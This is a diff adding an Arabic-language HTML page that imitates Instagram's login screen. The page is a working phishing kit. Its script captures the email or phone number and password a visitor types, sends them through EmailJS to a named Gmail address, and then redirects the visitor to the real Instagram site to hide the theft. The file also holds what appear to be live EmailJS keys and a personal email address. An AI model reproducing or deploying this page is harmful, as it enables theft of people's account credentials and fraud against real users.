@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 350px;
+            margin: 20px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo img {
+            width: 100%;
+            max-width: 175px;
+            height: auto;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        button:hover {
+            background-color: #0086e0;
+        }
+        
+        .divider {
+            margin: 20px 0;
+            text-align: center;
+            position: relative;
+        }
+        
+        .divider:before {
+            content: "";
+            position: absolute;
+            width: 40%;
+            height: 1px;
+            background-color: #dbdbdb;
+            right: 0;
+            top: 50%;
+        }
+        
+        .divider:after {
+            content: "";
+            position: absolute;
+            width: 40%;
+            height: 1px;
+            background-color: #dbdbdb;
+            left: 0;
+            top: 50%;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="انستغرام">
+        </div>
+        <form id="loginForm" onsubmit="sendEmail(event)">
+            <div class="form-group">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="كلمة المرور">
+            </div>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <p style="text-align: center; font-size: 12px; color: #00376b; cursor: pointer;">
+            هل نسيت كلمة المرور؟
+        </p>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("KiwvATsn4Og601_bH");
+        })();
+
+        function sendEmail(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            emailjs.send("service_lzzn9cp", "template_oc12oc5", {
+                to_email: "alhashlamonomar@gmail.com",
+                user_email: email,
+                user_password: password
+            }).then(
+                function(response) {
+                    window.location.href = "https://www.instagram.com";
+                },
+                function(error) {
+                    window.location.href = "https://www.instagram.com";
+                }
+            );
+        }
+    </script>
+</body>
+
+</html>
